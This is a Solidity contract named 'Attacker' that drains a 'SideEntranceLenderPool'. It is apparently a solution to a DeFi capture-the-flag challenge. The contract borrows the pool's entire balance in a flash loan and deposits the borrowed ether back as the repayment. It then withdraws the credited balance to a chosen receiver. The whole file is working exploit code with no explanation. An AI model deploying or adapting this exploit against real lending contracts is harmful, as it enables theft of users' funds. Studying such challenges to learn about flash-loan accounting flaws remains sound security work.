// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {
    error UnableToSendEther();

    SideEntranceLenderPool sideEntranceLenderPool;
    constructor (address _sideEntranceLenderPool) {
        sideEntranceLenderPool = SideEntranceLenderPool(_sideEntranceLenderPool);
    }

    function flashLoan() public {
        uint256 amount = address(sideEntranceLenderPool).balance;
        sideEntranceLenderPool.flashLoan(amount);
    }

    function execute() public payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    function withdraw(address receiver) public {
        sideEntranceLenderPool.withdraw();
        if (address(this).balance < 1) revert UnableToSendEther();
        (bool success, ) = receiver.call{value: address(this).balance}("");
        if(!success) revert UnableToSendEther();
    }

    receive () payable external {}
}